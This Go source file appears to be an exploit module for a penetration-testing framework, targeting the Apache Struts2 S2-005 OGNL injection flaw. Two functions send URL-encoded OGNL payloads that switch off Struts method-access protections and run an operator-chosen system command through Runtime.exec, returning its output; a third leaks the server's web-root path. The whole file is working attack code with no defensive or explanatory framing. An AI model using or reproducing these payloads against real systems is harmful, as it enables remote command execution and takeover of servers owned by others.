package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_S2_005 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_005) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'lz520520\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))`
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}
func (self *Exp_S2_005) Attack_cmd2() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)((%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()%27)(d))&(g)(('%5C43mycmd%5C75%22lz520520%22')(g))&(h)(('%5C43myret%5C75@java.lang.Runtime@getRuntime().exec(%5C43mycmd)')(d))&(i)(('%5C43mydat%5C75new%5C40java.io.DataInputStream(%5C43myret.getInputStream())')(d))&(j)(('%5C43myres%5C75new%5C40byte%5B51020%5D')(d))&(k)(('%5C43mydat.readFully(%5C43myres)')(d))&(l)(('%5C43mystr%5C75new%5C40java.lang.String(%5C43myres)')(d))&(m)(('%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('%5C43myout.getWriter().println(%5C43mystr)')(d))`
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	//target := strings.TrimRight(self.Params.BaseParam.Target, "?")  + shellPayload

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_S2_005) Attack_getmsg2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `&(%27%5C43_memberAccess.allowStaticMethodAccess%27)(a)=true&(b)((%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27)(b))&(%27%5C43c%27)((%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27)(c))&(g)((%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()%27)(d))&(i2)((%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(i2)((%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(i95)((%27%5C43xman.getWriter().println(%5C43req.getRealPath(%22/%22))%27)(d))&(i99)((%27%5C43xman.getWriter().close()%27)(d))`
	//target := strings.TrimRight(self.Params.BaseParam.Target, "?")  + shellPayload
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_S2_005{}, "exp_S2_005.yml")
}
